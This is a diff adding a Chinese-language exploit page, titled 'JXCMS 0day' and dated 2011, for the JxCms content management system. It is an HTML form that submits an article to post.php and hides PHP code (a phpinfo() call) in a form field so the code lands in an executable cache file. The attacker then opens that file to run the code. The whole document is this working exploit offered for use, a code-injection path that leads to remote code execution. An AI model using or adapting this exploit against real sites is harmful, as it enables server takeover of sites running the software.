@@ -1,0 +1,100 @@
+JXCMS 0day
+
+—————–分割线———————– 下面就是exp
+
+<html>
+
+<head>
+
+<meta http-equiv=”Content-Type” content=”text/html; charset=gbk” />
+
+<title>JxCms Exp</title>
+
+</head>
+
+<body>
+
+<div id=”post”>
+
+<h3>#Date 2011.9.28</h3><hr />
+
+<h4>#Team : 和谐小组</h4><hr />
+
+<h5>#Author:欧欧</h5><hr />
+
+<form action=”http://www.2cto.com /post.php?action=addarticle”method=”post”name=”myform”> <!–填写路径–>
+
+<input type=”hidden”name=”hash”value=”6fb0d7934c82ea5″/>   <dl>
+
+<br>
+
+<dt><span>*</span>目录：http://xxxx/cache/目录/list_new_10.php</dt>
+
+<dd>
+
+<select name=”info[catid]” id=”catid” require=”true” datatype=”number” msg=”" msgid=”catid_info”>
+
+<option value=”>请选择…</option>
+
+ 
+
+<option value=’2′>2</option><option value=’3′>3</select>
+
+<span id=”catid_info”></span></dd>
+
+</dl>
+
+<dl>
+
+<dt><span>*</span> 标  题：</dt>
+
+<dd><input type=”text” name=”info[title]” value=”"
+
+size=”60″require=”true”datatype=”require”msg=”标题不能为空”
+
+/></dd>
+
+<dt><span>*</span>内容：<br />最多1000000个英文字符</dt>
+
+<dd><textarea id=”content” name=”info[content]”
+
+style=”width: 600px; height: 200px;” require=”true” datatype=”require”
+
+msg=”内容不能为空”>{H.X.S.T}</textarea></dd>
+
+<dl>
+
+<dt> </dt>
+
+<td>Code:</td>
+
+<td><input type=”text” value=”" hkmjj=”<?php
+
+phpinfo();?>” name=”info[defaultpicurl]” id=”defaultpicurl”
+
+size=”25″></td>
+
+<span>*</span> 验证码：</dt>
+
+<dd><input type=”text”size=”4″name=”captcha”
+
+require=”true”datatype=”require”msg=”验证码不能为空”msgid=”captcha_info”
+
+/> <img src=”http://xxxxxxxx /captcha.php”id=”code_img”align=”absmiddle”title=”看不清？点击更换验证码”><span id=”captcha_info”></span>
+
+<dd><button type=”submit”name=”submit”value=”submit”>提 交</button></dd>
+
+http://www.2cto.com /cache/目录/list_new_10.php
+
+</form>
+
+</div>
+
+<!–end main–>
+
+</body>
+
+</html>
+
+——————————无敌分割线——————————
+
